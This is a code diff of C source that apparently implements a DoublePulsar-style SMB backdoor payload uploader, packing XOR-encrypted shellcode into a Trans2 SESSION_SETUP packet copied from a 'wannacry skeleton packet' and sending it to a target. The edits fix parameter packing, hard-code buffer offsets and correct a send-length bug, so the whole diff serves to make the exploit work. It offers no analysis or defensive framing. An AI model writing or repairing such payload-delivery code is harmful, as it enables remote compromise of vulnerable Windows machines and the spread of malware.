@@ -282,8 +282,9 @@ int main(int argc, char* argv[])
 	//generate the SESSION_SETUP parameters here
 	unsigned int TotalSizeOfPayload = EntireShellcodeSize ^ XorKey;
 	unsigned int ChunkSize = 4096 ^ XorKey;
-	unsigned int OffsetofChunkinPayload = XorKey ^ XorKey;
-
+	unsigned int OffsetofChunkinPayload = 0 ^ XorKey;
+	char Parametersbuffer[12];
+	
 	//allocate memory for encrypted shellcode payload buffer
 	unsigned char *encrypted;
 	encrypted = (unsigned char*)malloc(4096+1);
@@ -308,7 +309,9 @@ int main(int argc, char* argv[])
 	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
 	memset(big_packet, 0x00, 4178+1);
 
+	//POSSIBLY OBSOLETE, COMMENTING OUT UNTIL FURTHER NOTICE: 
 	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
+	/*
 	unsigned char CHAR_XOR_KEY[4];
 
 	CHAR_XOR_KEY[0] = XorKey & 0xFF;
@@ -334,24 +337,27 @@ int main(int argc, char* argv[])
 	OffsetofChunkinPayloadCHAR[1] = (OffsetofChunkinPayload >> 8) & 0xFF;
 	OffsetofChunkinPayloadCHAR[2] = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
 	OffsetofChunkinPayloadCHAR[3] = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;
-
+	*/
+	
 	//copy wannacry skeleton packet to big Trans2 packet
 	memcpy(big_packet, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
 
-	//copy SESSION_SETUP parameters
-	memcpy(big_packet + sizeof(wannacry_Trans2_Request), TotalSizeOfPayloadCHAR,4);
-	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 4, ChunkSizeCHAR,4);
-	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 8, OffsetofChunkinPayloadCHAR,4);
+	memcpy(Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
+	memcpy(Parametersbuffer + 4, (char*)&ChunkSize, 4);
+	memcpy(Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
+	
+	memcpy(big_packet + 70, Parametersbuffer, 12);
 	
 	//copy encrypted payload
-	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 12, encrypted, 4096);
+	memcpy(big_packet + 82, encrypted, 4096);
 
 	//Update treeID, UserID
 	memcpy(big_packet + 28, (char*)&treeid, 2);
 	memcpy(big_packet + 32, (char*)&userid, 2);
 	
   	//send packet
-	send(sock, (char*)big_packet, sizeof(big_packet)-1, 0);
+	//send(sock, (char*)big_packet, sizeof(big_packet)-1, 0);
+	send(sock, (char*)big_packet, 4178, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	free(encrypted);
